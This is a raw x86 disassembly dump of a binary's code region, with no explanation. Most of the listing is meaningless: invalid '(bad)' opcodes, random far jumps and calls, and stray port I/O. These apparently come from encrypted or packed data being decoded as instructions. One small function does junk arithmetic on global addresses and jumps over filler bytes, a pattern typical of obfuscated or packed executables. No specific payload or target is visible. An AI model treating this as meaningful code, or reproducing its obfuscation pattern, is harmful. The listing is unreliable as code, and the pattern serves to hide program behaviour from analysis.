  40951b:	sub    eax,0x3ef11f
  409520:	nop
  409521:	js     0x409539
  409523:	js     0x40955f
  409525:	xchg   ebx,eax
  409526:	call   0x186d53d7
  40952b:	pop    edx
  40952c:	into   
  40952d:	sub    eax,0x8437673b
  409532:	mov    ecx,0xa52a8176
  409537:	mov    ebx,0xf724f369
  40953c:	gs pop esp
  40953e:	dec    ebx
  40953f:	xchg   edx,eax
  409540:	add    BYTE PTR [edi],ah
  409542:	jle    0x4095c2
  409544:	push   es
  409545:	or     al,0xa3
  409547:	pop    edx
  409548:	xchg   ebp,eax
  409549:	fwait
  40954a:	jl     0x409574
  40954c:	bound  ebx,QWORD PTR [edi-0x46d3f70]
  409552:	bnd jl 0x409599
  409555:	call   0xd26:0x7497af5e
  40955c:	inc    ebx
  40955d:	cmp    DWORD PTR [esi+edx*4-0x3afa2f39],esi
  409564:	out    0xb9,al
  409566:	lahf   
  409567:	rcl    BYTE PTR [ebx+0x71],1
  40956a:	sbb    DWORD PTR [eax+0x18],eax
  40956d:	outs   dx,BYTE PTR ds:[esi]
  40956e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40956f:	ins    BYTE PTR es:[edi],dx
  409570:	stos   DWORD PTR es:[edi],eax
  409571:	mov    eax,ds:0x23789233
  409576:	xor    al,0xb5
  409578:	pop    edi
  409579:	repz xchg ebx,eax
  40957b:	lea    ecx,[edi-0x29]
  40957e:	jp     0x409505
  409580:	gs dec edi
  409582:	mov    DWORD PTR cs:[ebx+0x7d98756b],esi
  409589:	mov    ebx,0x48de2791
  40958e:	out    dx,eax
  40958f:	sbb    eax,0xbd4928de
  409594:	nop
  409595:	mov    DWORD PTR [ecx],edx
  409597:	jp     0x4095cf
  409599:	inc    edx
  40959a:	dec    eax
  40959b:	mov    ?,WORD PTR [edi+0x48f5dc7c]
  4095a1:	jecxz  0x409559
  4095a3:	fst    DWORD PTR [ecx-0x3b]
  4095a6:	inc    esi
  4095a7:	lea    ecx,[edi+eax*2-0x18]
  4095ab:	repnz std 
  4095ad:	int3   
  4095ae:	adc    DWORD PTR [ecx+0x726eacc5],0xb
  4095b5:	and    eax,0xd04f07c1
  4095ba:	jge    0x40958c
  4095bc:	pushf  
  4095bd:	adc    al,0xab
  4095bf:	loopne 0x40954f
  4095c1:	pop    ds
  4095c2:	(bad)  
  4095c3:	push   ds
  4095c4:	xor    ebp,DWORD PTR [edx+0x3911a3ae]
  4095ca:	shl    BYTE PTR [eax+0x5761591e],cl
  4095d0:	ret    
  4095d1:	xchg   ebx,eax
  4095d2:	rcr    BYTE PTR [esi-0x26],cl
  4095d5:	xchg   al,ah
  4095d7:	mov    ds,WORD PTR [ebx+0x4e]
  4095da:	(bad)  
  4095db:	adc    esp,ebx
  4095dd:	out    dx,al
  4095de:	or     ebp,DWORD PTR [edi+0x109ce4db]
  4095e4:	jbe    0x409602
  4095e6:	ins    DWORD PTR es:[edi],dx
  4095e7:	pop    ss
  4095e8:	out    dx,eax
  4095e9:	(bad)  
  4095ea:	call   0x406b0f
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8e77:0x9ef0674e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	(bad)  
  40960d:	adc    al,0x89
  40960f:	pop    edi
  409610:	push   cs
  409611:	(bad)  
  409612:	(bad)  
  409613:	in     al,0x95
  409615:	cli    
  409616:	add    DWORD PTR [edx],ecx
  409618:	imul   ecx,DWORD PTR [esi+ebx*4],0xfc7e79a9
  40961f:	ins    BYTE PTR es:[edi],dx
  409620:	test   BYTE PTR [edx+ecx*2-0x5f],cl
  409624:	cli    
  409625:	lods   al,BYTE PTR ds:[esi]
  409626:	dec    esi
  409627:	mov    al,ds:0xd5d71f11
  40962c:	mov    ebx,DWORD PTR [ebp+0x79c62d55]
  409632:	pushf  
  409633:	or     edx,DWORD PTR [eax+ecx*8+0xd]
  409637:	mov    ecx,0x443c894d
  40963c:	lock xchg BYTE PTR [ecx],cl
  40963f:	sub    ah,BYTE PTR [ecx+0x4f]
  409642:	call   0xbcb8:0xa0fdc40a
  409649:	xchg   ebx,eax
  40964a:	xor    edi,esi
  40964c:	or     ch,bh
  40964e:	aam    0x74
  409650:	xchg   ebp,eax
  409651:	xchg   ecx,eax
  409652:	(bad)  [edx*8+0xe7add85]
  409659:	jns    0x40961f
  40965b:	lahf   
  40965c:	inc    esi
  40965d:	xchg   esi,eax
  40965e:	mov    edi,0x9e39c550
  409663:	jmp    DWORD PTR [edx+0x56]
  409666:	aam    0x6d
  409668:	pop    ecx
  409669:	dec    DWORD PTR [esi-0x42fd606]
  40966f:	mov    bh,0xde
  409671:	nop
  409672:	jl     0x40969c
  409674:	fistp  WORD PTR [ecx+edi*2-0x55]
  409678:	mov    ?,eax
  40967a:	cs int 0x82
  40967d:	sbb    edx,DWORD PTR [ecx]
  40967f:	ja     0x409697
  409681:	gs push edi
  409683:	fld    TBYTE PTR [esp+ebx*1]
  409686:	sub    bl,BYTE PTR [edx+0x9]
  409689:	cs retf 0x41c7
  40968d:	or     eax,0x580857ce
  409692:	pusha  
  409693:	sbb    ebx,DWORD PTR [eax]
  409695:	jl     0x409708
  409697:	or     BYTE PTR [edi],ah
  409699:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40969a:	and    dh,ah
  40969c:	std    
  40969d:	jmp    0x19e5:0x96043385
  4096a4:	jne    0x40963c
  4096a6:	fcomi  st,st(4)
  4096a8:	fnstsw WORD PTR [esi-0x14da60b7]
  4096ae:	lds    esp,FWORD PTR [eax]
  4096b0:	xor    al,0xa5
  4096b2:	jge    0x4096e1
  4096b4:	inc    eax
  4096b5:	mov    edx,esp
  4096b7:	inc    edx
  4096b8:	sub    dl,dl
  4096ba:	(bad)  
  4096bb:	sub    eax,0x9e0ecd46
  4096c0:	lods   eax,DWORD PTR ds:[esi]
  4096c1:	pop    edi
  4096c2:	jl     0x409726
  4096c4:	test   DWORD PTR [edi+0x23],esi
  4096c7:	in     al,0x82
  4096c9:	pop    esp
  4096ca:	mov    WORD PTR [ebp+0x7fcdcdb7],ds
  4096d0:	mov    eax,ds:0x88738092
  4096d5:	xor    al,0x90
  4096d7:	sbb    eax,0x33b01282
  4096dc:	loope  0x409692
  4096de:	call   0x6130:0x88924941
  4096e5:	sbb    ah,bl
  4096e7:	repz jmp FWORD PTR [esi+0x646a4922]
  4096ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096ef:	les    eax,FWORD PTR [esi]
  4096f1:	inc    esi
  4096f2:	lods   al,BYTE PTR ds:[esi]
  4096f3:	fst    QWORD PTR [ebp+0x5e]
  4096f6:	hlt    
  4096f7:	pushf  
  4096f8:	add    BYTE PTR [edi-0x69],ah
  4096fb:	inc    esi
  4096fc:	aas    
  4096fd:	sbb    eax,0xcea3f602
  409702:	lods   al,BYTE PTR ds:[esi]
  409703:	add    bh,ah
  409705:	call   0xa9a2:0x926a0b3
  40970c:	xchg   edx,eax
  40970d:	push   edx
  40970e:	and    DWORD PTR [ebx],ecx
  409710:	add    eax,0x99772877
  409715:	mov    ds:0xbef0c6ab,al
  40971a:	shr    DWORD PTR [edi],cl
  40971c:	stc    
  40971d:	cdq    
  40971e:	dec    DWORD PTR [esi]
  409720:	(bad)  
  409722:	add    BYTE PTR [eax+0x3537032d],bl
  409728:	jg     0x40972c
  40972a:	arpl   WORD PTR [ecx+0x12],bp
  40972d:	push   edi
  40972e:	xchg   DWORD PTR [edx],esp
  409730:	push   ebx
  409731:	pop    ebx
  409732:	in     eax,dx
  409733:	mov    edi,0x414e149c
  409738:	push   ebx
  409739:	rol    WORD PTR [ebx-0x2894482f],0x46
  409741:	mov    eax,ds:0xe7c91a3c
  409746:	mov    bh,0x10
  409748:	push   edi
  409749:	out    dx,al
  40974a:	mov    bl,0x2f
  40974c:	cld    
  40974d:	pop    esp
  40974e:	sub    eax,0x55c473d2
  409753:	adc    DWORD PTR [edi-0x32a0a260],eax
  409759:	mov    ah,0xc3
  40975b:	imul   edx,DWORD PTR [ecx+0x6449903f],0xa88d1926
  409765:	jg     0x409711
  409767:	fxch   st(4)
  409769:	mov    BYTE PTR gs:[esi-0x3001c8cc],al
  409770:	push   es
  409771:	(bad)  
  409772:	push   esp
  409773:	(bad)  
  409774:	loope  0x409788
  409776:	inc    eax
  409777:	imul   eax,DWORD PTR [ebp+0x78],0x38
  40977b:	ins    BYTE PTR es:[edi],dx
  40977c:	std    
  40977d:	outs   dx,BYTE PTR ds:[esi]
  40977e:	add    ecx,eax
  409780:	imul   edx,DWORD PTR [edi+0x7c64517a],0x4154b18b
  40978a:	mov    esi,es
  40978c:	add    BYTE PTR [ebp+0x111360fd],dl
  409792:	mov    bh,0x85
  409794:	add    esp,DWORD PTR [edi]
  409796:	gs mov esp,0x2f9e9e1c
  40979c:	jno    0x40972a
  40979e:	add    bl,BYTE PTR [esi-0x3e]
  4097a1:	mov    ebx,0x66fad79d
  4097a6:	(bad)  
  4097a7:	(bad)  [ebp-0x7b]
  4097aa:	fnstsw WORD PTR [edx+0x47]
  4097ad:	dec    edi
  4097ae:	pop    ss
  4097af:	push   DWORD PTR [ecx+0x36]
  4097b2:	lods   eax,DWORD PTR ds:[esi]
  4097b3:	sbb    al,dl
  4097b5:	xor    al,0x5d
  4097b7:	popa   
  4097b8:	xor    BYTE PTR [ecx],ah
  4097ba:	in     eax,0xcf
  4097bc:	dec    esp
  4097bd:	adc    al,0xd6
  4097bf:	fbstp  TBYTE PTR [edi+0x5d0b2960]
  4097c5:	and    BYTE PTR [eax-0x51e4c939],al
  4097cb:	push   ecx
  4097cc:	psllw  mm7,QWORD PTR [esi-0x4d]
  4097d0:	sahf   
  4097d1:	ret    0x700d
  4097d4:	retf   0xf4a4
  4097d7:	je     0x4097b9
  4097d9:	pop    es
  4097da:	cmp    ah,BYTE PTR ds:0x8c5388a8
  4097e0:	and    al,0x7f
  4097e2:	dec    edx
  4097e3:	gs fs xchg ebp,eax
  4097e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097e7:	mov    eax,0xee4aa608
  4097ec:	lds    eax,FWORD PTR [esi]
  4097ee:	sbb    ah,BYTE PTR [ebx-0x72]
  4097f1:	cs sbb al,0x7a
  4097f4:	push   0xffffffa2
  4097f6:	mov    cl,0xe3
  4097f8:	lods   al,BYTE PTR ds:[esi]
  4097f9:	jecxz  0x4097fd
  4097fb:	call   0x562a:0x811f6f1e
  409802:	sub    BYTE PTR [ecx+0x4d751f60],ah
  409808:	add    bl,BYTE PTR [eax]
  40980a:	mov    bh,0xf
  40980c:	jge    0x409800
  40980e:	adc    DWORD PTR [edx+edx*1+0x5700db24],edi
  409815:	xlat   BYTE PTR ds:[ebx]
  409816:	mul    DWORD PTR [ebp-0x4b]
  409819:	call   DWORD PTR [esi-0x21]
  40981c:	test   eax,0x7d255c8e
  409821:	fist   WORD PTR [esi-0x7f42e31c]
  409827:	jl     0x4097e4
  409829:	daa    
  40982a:	jmp    0x59cb03c1
  40982f:	pop    es
  409830:	jmp    0x8be7:0xbaa93c91
  409837:	inc    ebp
  409838:	hlt    
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x4337df
  40986f:	xor    DWORD PTR ds:0x433717,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x4337db,0x4337ab
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x433767,0x433813
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x4336fb
  4098a6:	sub    DWORD PTR ds:0x4337df,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	jne    0x409885
  4098c2:	pop    es
  4098c3:	ja     0x409879
  4098c5:	fnstcw WORD PTR [esi+0x7e]
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	push   DWORD PTR [ebp-0x3ec6739]
  4098d2:	push   esi
  4098d3:	mov    BYTE PTR [eax+0x70],0x4b
  4098d7:	rol    BYTE PTR [esi+ebp*8+0x4ee5dd4d],0x5a
  4098df:	(bad)  [edx+0x32]
  4098e2:	repnz mov WORD PTR [esi-0x45],ss
  4098e6:	add    esi,DWORD PTR [eax+esi*1]
  4098e9:	stc    
  4098ea:	stos   BYTE PTR es:[edi],al
  4098eb:	mov    ah,0x90
  4098ed:	out    0xb4,eax
  4098ef:	(bad)  
  4098f0:	or     ch,BYTE PTR [ebp+0x34ff0e8]
  4098f6:	push   esi
  4098f7:	xor    ch,BYTE PTR [ebx-0x6214b96d]
  4098fd:	les    ecx,FWORD PTR [ebx]
  4098ff:	loop   0x409889
  409901:	sbb    al,0x1f
  409903:	sbb    ecx,0xffffffcc
  409906:	jg     0x4098a9
  409908:	jl     0x4098cd
  40990a:	xchg   esi,eax
  40990b:	cmp    BYTE PTR ds:0xf816194f,dl
  409911:	test   eax,0x6773f808
  409916:	rcl    DWORD PTR [esi-0x18],cl
  409919:	sub    al,BYTE PTR [ebx+0x45]
  40991c:	jns    0x409924
  40991e:	push   ebp
  40991f:	mov    ss,WORD PTR [eax]
  409921:	mov    dh,0xe7
  409923:	push   es
  409924:	out    dx,eax
  409925:	scas   al,BYTE PTR es:[edi]
  409926:	inc    ecx
  409927:	cmp    esi,DWORD PTR [eax-0x478b371f]
  40992d:	push   ds
  40992e:	fadd   DWORD PTR [edx-0x43]
  409931:	or     dh,ch
  409933:	pop    ds
  409934:	scas   al,BYTE PTR es:[edi]
  409935:	mov    edi,0xb6f0b665
  40993a:	xor    DWORD PTR [bp+di+0x636e],edi
  40993f:	push   edi
  409940:	pop    es
  409941:	retf   0xc897
  409944:	sti    
  409945:	les    esp,FWORD PTR [eax]
  409947:	sub    al,0x21
  409949:	xor    esi,0x88d64b32
  40994f:	inc    edx
  409950:	sbb    BYTE PTR [eax-0x12],ch
  409953:	imul   eax,DWORD PTR [edi+0x14],0x5b295eac
  40995a:	mov    al,ds:0x9aa434fd
  40995f:	imul   DWORD PTR [ebx-0x5c]
  409962:	xor    ebp,DWORD PTR [ebp-0xb53a72b]
  409968:	aaa    
  409969:	bound  esp,QWORD PTR [eax]
  40996b:	out    dx,al
  40996c:	cld    
  40996d:	jo     0x409958
  40996f:	xor    eax,0xbbdcb4c8
  409974:	scas   al,BYTE PTR es:[edi]
  409975:	ins    DWORD PTR es:[edi],dx
  409976:	adc    dh,ch
  409978:	int3   
  409979:	dec    edx
  40997a:	enter  0x21b6,0x3b
  40997e:	out    0xc3,al
  409980:	jb     0x409912
  409982:	(bad)  
  409983:	xchg   edx,eax
  409984:	aaa    
  409985:	mov    esp,0x703a4472
  40998a:	xchg   edi,eax
  40998b:	jle    0x409912
  40998d:	mov    eax,DWORD PTR [ebx+0x594ef438]
  409993:	sbb    al,0x1b
  409995:	push   edi
  409996:	xchg   edi,eax
  409997:	das    
  409998:	sbb    BYTE PTR [esi+0xa8f4832],dl
  40999e:	adc    eax,0x30f1e5d1
  4099a3:	rol    dh,0xab
  4099a6:	mov    cl,0xc7
  4099a8:	cmp    al,0x6e
  4099aa:	push   ebp
  4099ab:	jno    0x4099d9
  4099ad:	inc    edx
  4099ae:	xchg   esp,eax
  4099af:	(bad)
  4099b3:	loope  0x40997e
  4099b5:	mov    ebx,0x10df00ef
  4099ba:	mov    esi,0xb19a4107
  4099bf:	arpl   WORD PTR [eax-0x21],bx
  4099c2:	push   0x86528f3a
  4099c7:	jmp    0xab3:0x942a79f
  4099ce:	jnp    0x409979
  4099d0:	rcr    DWORD PTR [esi+0x21ba8bca],cl
  4099d6:	cmc    
  4099d7:	mov    edx,0x75c132cd
  4099dc:	jne    0x40999a
  4099de:	pop    ebx
  4099df:	xor    eax,0xaf5c7675
  4099e4:	jp     0x409a45
  4099e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099e7:	mov    eax,0x3f6fef44
  4099ec:	jmp    0xf061:0xdc643b86
  4099f3:	mov    ebx,DWORD PTR [esi]
  4099f5:	xchg   ecx,eax
  4099f6:	ins    DWORD PTR es:[edi],dx
  4099f7:	add    dh,dl
  4099f9:	popf   
  4099fa:	test   dh,ah
  4099fc:	xor    DWORD PTR [eax],ebp
  4099fe:	(bad)  
  4099ff:	and    eax,0x634ebba8
  409a04:	sub    eax,0xdeae712b
  409a09:	fwait
  409a0a:	jle    0x409a59
  409a0c:	test   al,0x30
  409a0e:	enter  0x25bc,0x37
  409a12:	cdq    
  409a13:	cmp    ecx,DWORD PTR [edi+0x7dc99233]
  409a19:	dec    ebx
  409a1a:	add    al,BYTE PTR [edi]
  409a1c:	dec    ebx
  409a1d:	in     eax,dx
  409a1e:	je     0x409a54
  409a20:	cmp    al,0x3a
  409a22:	cli    
  409a23:	xor    al,0x9d
  409a25:	cli    
  409a26:	sub    cl,bl
  409a28:	sti    
  409a29:	mov    ebp,0xb7cec619
  409a2e:	mov    edx,0x252846cc
  409a33:	mov    ah,0xd2
  409a35:	adc    ebx,eax
  409a37:	call   FWORD PTR [esi+0x51]
  409a3a:	jae    0x4099c4
  409a3c:	pop    ds
  409a3d:	jne    0x409a4b
  409a3f:	mov    ecx,0xe614d0bb
  409a44:	das    
  409a45:	sbb    ebp,DWORD PTR [ebp-0x13]
  409a48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a49:	in     eax,dx
  409a4a:	pop    esi
  409a4b:	call   0xed1b98bb
  409a50:	jno    0x409a09
  409a52:	sahf   
  409a53:	mov    DWORD PTR [ebx],esp
  409a55:	dec    edx
  409a56:	jno    0x409a49
  409a58:	aad    0x96
  409a5a:	mov    cl,0x26
  409a5c:	mov    edi,0xbf095848
  409a61:	pop    ebx
  409a62:	mov    ecx,0xa50cc8fa
  409a67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a68:	lea    edx,[edx-0x94868c7]
  409a6e:	push   eax
  409a6f:	mov    al,0x73
  409a71:	out    dx,al
  409a72:	inc    ebp
  409a73:	xor    eax,DWORD PTR [edx]
  409a75:	inc    ebx
  409a76:	xor    al,0x8d
  409a78:	arpl   WORD PTR [ebx],cx
  409a7a:	into   
  409a7b:	cwde   
  409a7c:	pop    esi
  409a7d:	dec    ebp
  409a7e:	adc    eax,0xbb658b10
  409a83:	inc    esi
  409a84:	pop    ss
  409a85:	and    BYTE PTR [esi],bl
  409a87:	out    dx,al
  409a88:	and    BYTE PTR [ebp-0x3473858d],al
  409a8e:	sub    dl,BYTE PTR [ebx-0x48]
  409a91:	inc    bx
  409a93:	sub    esi,DWORD PTR [ebp+ebp*1+0x7bffb1c6]
  409a9a:	add    BYTE PTR [esi-0x56c2d885],0x4f
  409aa1:	jae    0x409a5d
  409aa3:	aam    0x10
  409aa5:	jno    0x409a48
  409aa7:	mov    DWORD PTR [eax-0xa],ebx
  409aaa:	pop    edi
  409aab:	shr    ebx,0x38
  409aae:	aaa    
  409aaf:	(bad)  [ebx+0x32f64a04]
  409ab5:	into   
  409ab6:	idiv   esp
  409ab8:	sub    edi,DWORD PTR [ebp-0x24]
  409abb:	adc    esi,DWORD PTR [ebp+0x15bc7252]
  409ac1:	dec    esp
  409ac2:	mov    eax,ds:0x7fd5fc9f
  409ac7:	fmul   QWORD PTR [ecx]
  409ac9:	jl     0x409a68
  409acb:	push   esi
  409acc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409acd:	mov    ecx,0x954998e1
  409ad2:	cwde   
  409ad3:	rcl    BYTE PTR [ecx],1
  409ad5:	ss (bad) 
  409ad7:	out    0xdf,al
  409ad9:	sbb    al,0xdf
  409adb:	mov    bh,0xf1
  409add:	jb     0x409b12
  409adf:	sub    edx,DWORD PTR [eax-0x1a]
  409ae2:	repz (bad) 
  409ae4:	int    0x6a
  409ae6:	jmp    0x96bf331a
  409aeb:	test   eax,0x7f1f64e4
  409af0:	js     0x409a85
  409af2:	mov    DWORD PTR gs:[esi+0x1db130ff],ecx
  409af9:	inc    ecx
  409afa:	stos   DWORD PTR es:[edi],eax
  409afb:	push   edi
  409afc:	mov    eax,0x229f4691
  409b01:	mov    eax,esi
  409b03:	adc    ch,al
  409b05:	call   0xe120:0xe033364
  409b0c:	inc    edi
  409b0d:	and    BYTE PTR gs:[edi+ebx*8],cl
  409b11:	rcl    BYTE PTR [esi+0x57],cl
  409b14:	sbb    DWORD PTR ds:0x43379f,0x433753
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi-0x786d682c]
  409b32:	(bad)  
  409b33:	jle    0x409b19
  409b35:	jle    0x409bb5
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	fisub  DWORD PTR [edi-0x7cf31ff4]
  409b41:	push   edi
  409b42:	jle    0x409bb8
  409b44:	jg     0x409b43
  409b46:	rcl    BYTE PTR [ebx+eax*8],1
  409b49:	pop    ss
  409b4a:	cdq    
  409b4b:	add    BYTE PTR [edi+0x543300cb],0xf
  409b52:	mov    gs,WORD PTR [ebp-0x49ba0e26]
  409b58:	hlt    
  409b59:	popf   
  409b5a:	pushf  
  409b5b:	or     BYTE PTR [ebp+0x28fe1e70],al
  409b61:	aad    0xf1
  409b63:	outs   dx,BYTE PTR ds:[esi]
  409b64:	cmp    eax,0x393a6945
  409b69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b6a:	icebp  
  409b6b:	(bad)  
  409b6c:	fsubr  DWORD PTR [ebx-0x69eb6cb8]
  409b72:	std    
  409b73:	shl    edi,cl
  409b75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b76:	jle    0x409b9b
  409b78:	inc    edx
  409b79:	call   0x17add3e8
  409b7e:	adc    DWORD PTR [ecx+0x26],eax
  409b81:	dec    ebp
  409b82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b83:	out    0xea,eax
  409b85:	or     BYTE PTR [ebp-0x6f168b7d],ah
  409b8b:	fst    QWORD PTR [esi]
  409b8d:	outs   dx,DWORD PTR ds:[esi]
  409b8e:	cmc    
  409b8f:	lods   al,BYTE PTR ds:[esi]
  409b90:	sbb    DWORD PTR [ebx+0x8],esp
  409b93:	aad    0x46
  409b95:	mov    ds:0x19115aae,eax
  409b9a:	jle    0x409bcc
  409b9c:	stc    
  409b9d:	or     eax,0xb4c5513f
  409ba2:	cmp    eax,0xa4a8fc75
  409ba7:	fdiv   DWORD PTR [ecx+0x4c]
  409baa:	mov    dh,0x5e
  409bac:	jecxz  0x409b56
  409bae:	mov    ah,0xae
  409bb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bb1:	sbb    al,BYTE PTR [eax-0x3]
  409bb4:	les    esi,FWORD PTR [edi+0x6d7ca98]
  409bba:	out    dx,eax
  409bbb:	test   al,0x31
  409bbd:	retf   0x93f3
  409bc0:	xlat   BYTE PTR ds:[ebx]
  409bc1:	inc    edx
  409bc2:	in     eax,0xd0
  409bc4:	inc    esi
  409bc5:	aad    0x8e
  409bc7:	xor    bl,al
  409bc9:	test   ebx,ebx
  409bcb:	inc    edi
  409bcc:	add    dh,BYTE PTR [edi]
  409bce:	mov    al,0x18
  409bd0:	popf   
  409bd1:	inc    ebx
  409bd2:	mov    ah,0x8d
  409bd4:	mov    esi,0x4a976e56
  409bd9:	jp     0x409c41
  409bdb:	jl     0x409bdc
  409bdd:	dec    ebp
  409bde:	lea    esp,[ecx+0x7783e507]
  409be4:	test   eax,0xde477b53
  409be9:	and    DWORD PTR [ecx-0x726f9f2d],edx
  409bef:	gs xchg esp,eax
  409bf1:	cmp    BYTE PTR [edi],dh
  409bf3:	dec    ebx
  409bf4:	retf   
  409bf5:	dec    ecx
  409bf6:	enter  0x6351,0x75
  409bfa:	pop    esi
  409bfb:	aad    0x4a
  409bfd:	or     DWORD PTR [edx+ebx*4+0x67239232],esi
  409c04:	fistp  QWORD PTR [eax]
  409c06:	out    dx,eax
  409c07:	add    al,0x7c
  409c09:	adc    eax,0x543cb523
  409c0e:	jge    0x409bbc
  409c10:	jb     0x409c42
  409c12:	(bad)  
  409c13:	mov    ds:0x61943079,al
  409c18:	fstp   DWORD PTR [esi]
  409c1a:	jmp    0x57be:0xdd8e4ab0
  409c21:	push   ss
  409c22:	add    esp,esp
  409c24:	inc    edx
  409c25:	ja     0x409c2c
  409c27:	mov    edi,DWORD PTR [ebx+0x52]
  409c2a:	fxtract 
  409c2c:	rcl    DWORD PTR [ebx-0x52],1
  409c2f:	arpl   bx,di
  409c31:	or     eax,0xcb571bb3
  409c36:	pop    es
  409c37:	fidivr DWORD PTR [edx-0x4fc7d9d9]
  409c3d:	ja     0x409c63
  409c3f:	mov    al,ds:0x10f57f51
  409c44:	pop    ebx
  409c45:	jmp    0x409c40
  409c47:	stos   BYTE PTR es:[edi],al
  409c48:	ret    
  409c49:	leave  
  409c4a:	push   edi
  409c4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c4c:	cmp    ebx,DWORD PTR [esp+ebx*2]
  409c4f:	cwde   
  409c50:	pop    es
  409c51:	push   eax
  409c52:	sub    ah,BYTE PTR [edx]
  409c54:	jl     0x409be3
  409c56:	and    eax,eax
  409c58:	mov    ebx,0x7e685bd6
  409c5d:	loopne 0x409c7b
  409c5f:	pop    es
  409c60:	test   eax,0xe5b20b9
  409c65:	add    eax,0x46c21ebb
  409c6a:	add    BYTE PTR [edi+edx*8],ch
  409c6d:	adc    esi,DWORD PTR [ecx-0x7e]
  409c70:	sbb    ecx,DWORD PTR [edi+0x5015a9f4]
  409c76:	xor    ecx,esi
  409c78:	idiv   BYTE PTR [esi+eax*8]
  409c7b:	mov    ebx,?
  409c7d:	gs inc edx
  409c7f:	cwde   
  409c80:	pop    eax
  409c81:	mov    esp,0x5a2cc079
  409c86:	out    dx,al
  409c87:	leave  
  409c88:	dec    edx
  409c89:	sbb    esi,DWORD PTR [ecx]
  409c8b:	xchg   ecx,eax
  409c8c:	cmp    DWORD PTR [eax+0x5f],ebp
  409c8f:	sub    DWORD PTR [ebp-0x3fcc0a06],esi
  409c95:	nop
  409c96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c97:	out    0xd5,eax
  409c99:	stos   DWORD PTR es:[edi],eax
  409c9a:	js     0x409c8d
  409c9c:	and    DWORD PTR [edx+0x41677682],0x7c
  409ca3:	jg     0x409c5e
  409ca5:	(bad)  
  409ca7:	das    
  409ca8:	je     0x409c32
  409caa:	inc    esi
  409cab:	xor    DWORD PTR [ecx-0x14],ecx
  409cae:	push   edi
  409caf:	inc    ecx
  409cb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cb1:	test   eax,0xe4445109
  409cb6:	jg     0x409c92
  409cb8:	test   al,0xed
  409cba:	outs   dx,BYTE PTR ds:[esi]
  409cbb:	rcr    BYTE PTR [eax+0x19],1
  409cbe:	or     bh,BYTE PTR [edx-0x3d2a3a57]
  409cc4:	pop    ss
  409cc5:	cmp    ebx,DWORD PTR [ecx+edi*8]
  409cc8:	cmp    eax,0x23a76756
  409ccd:	push   ecx
  409cce:	(bad)  [ecx+0x7c95bd99]
  409cd4:	lods   al,BYTE PTR ds:[esi]
  409cd5:	cmp    DWORD PTR [edx],edi
  409cd7:	icebp  
  409cd8:	push   esi
  409cd9:	call   0x25aa212f
  409cde:	call   0xbcba:0xa4f1ff89
  409ce5:	push   es
  409ce6:	in     al,dx
  409ce7:	ror    BYTE PTR [esi],cl
  409ce9:	test   eax,0x68ff59c5
  409cee:	adc    al,0xc6
  409cf0:	jle    0x409d00
  409cf2:	arpl   WORD PTR [ebp+edi*1-0x5],cx
  409cf6:	or     esp,DWORD PTR [edi+ebx*2]
  409cf9:	and    edx,DWORD PTR [ebx-0x7210447e]
  409cff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d00:	pop    ecx
  409d01:	xor    eax,0xaf21fb7c
  409d06:	adc    esp,ecx
  409d08:	sbb    ecx,DWORD PTR [edi]
  409d0a:	out    0x12,al
  409d0c:	mov    eax,ds:0x9ff2bc6b
  409d11:	fisttp DWORD PTR [edx]
  409d13:	in     eax,0x67
  409d15:	sbb    eax,0xbe8097
  409d1a:	es popa 
  409d1c:	mov    al,ds:0xa7db2cc1
  409d21:	nop
  409d22:	cld    
  409d23:	inc    esi
  409d24:	xchg   ebx,eax
  409d25:	jne    0x409ce2
  409d27:	js     0x409cb2
  409d29:	int    0x45
  409d2b:	mul    BYTE PTR [ebp-0xb7cb9fa]
  409d31:	adc    al,0x94
